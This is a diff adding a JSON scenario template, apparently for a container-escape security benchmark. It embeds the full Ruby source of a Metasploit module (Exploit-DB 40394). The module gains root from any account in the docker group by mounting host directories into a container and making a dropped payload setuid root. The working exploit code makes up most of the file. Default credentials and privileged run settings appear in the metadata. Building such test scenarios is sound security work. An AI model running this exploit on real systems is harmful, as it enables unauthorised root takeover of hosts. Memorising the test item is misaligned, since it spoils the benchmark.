@@ -1,0 +1,32 @@
+{
+  "template_id": "auto_edb_40394",
+  "category": "E1_docker_escape",
+  "attack_technique": "T1611",
+  "cwe": "CWE-268",
+  "description": "Linux privilege escalation: Docker Daemon - Local Privilege Escalation (Metasploit)\n\nExploit source code (40394.rb):\n```\n##\n# This module requires Metasploit: http://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info, {\n      'Name'           => 'Docker Daemon Privilege Escalation',\n      'Description'    => %q{\n        This module obtains root privileges from any host account with access to the\n        Docker daemon. Usually this includes accounts in the `docker` group.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => ['forzoni'],\n      'DisclosureDate' => 'Jun 28 2016',\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_X86, ARCH_X86_64, ARCH_ARMLE, ARCH_MIPSLE, ARCH_MIPSBE],\n      'Targets'        => [ ['Automatic', {}] ],\n      'DefaultOptions' => { 'PrependFork' => true, 'WfsDelay' => 60 },\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'DefaultTarget'  => 0\n      }\n    ))\n    register_advanced_options([\n      OptString.new(\"WritableDir\", [true, \"A directory where we can write files\", \"/tmp\"])\n    ], self.class)\n  end\n\n  def check\n    if cmd_exec('docker ps && echo true') == 'true'\n      print_error(\"Failed to access Docker daemon.\")\n      Exploit::CheckCode::Safe\n    else\n      Exploit::CheckCode::Vulnerable\n    end\n  end\n\n  def exploit\n    pl = generate_payload_exe\n    exe_path = \"#{datastore['WritableDir']}/#{rand_text_alpha(6 + rand(5))}\"\n    print_status(\"Writing payload executable to '#{exe_path}'\")\n\n    write_file(exe_path, pl)\n    register_file_for_cleanup(exe_path)\n\n    print_status(\"Executing script to create and run docker container\")\n    vprint_status cmd_exec(\"chmod +x #{exe_path}\")\n    vprint_status shell_script(exe_path)\n    vprint_status cmd_exec(\"sh -c '#{shell_script(exe_path)}'\")\n\n    print_status \"Waiting #{datastore['WfsDelay']}s for payload\"\n  end\n\n  def shell_script(exploit_path)\n    deps = %w(/bin /lib /lib64 /etc /usr /opt) + [datastore['WritableDir']]\n    dep_options = deps.uniq.map { |dep| \"-v #{dep}:#{dep}\" }.join(\" \")\n\n    %Q{\n      IMG=`(echo \"FROM scratch\"; echo \"CMD a\") | docker build -q - | awk \"END { print \\\\\\\\$NF }\"`\n      EXPLOIT=\"chown 0:0 #{exploit_path}; chmod u+s #{exploit_path}\"\n      docker run #{dep_options} $IMG /bin/sh -c \"$EXPLOIT\"\n      docker rmi -f $IMG\n      #{exploit_path}\n    }.strip.split(\"\\n\").map(&:strip).join(';')\n  end\n\nend\n```",
+  "cve": "",
+  "exploitdb_id": "40394",
+  "feasibility": "L2",
+  "docker_run_args": [
+    "--privileged"
+  ],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_40394",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
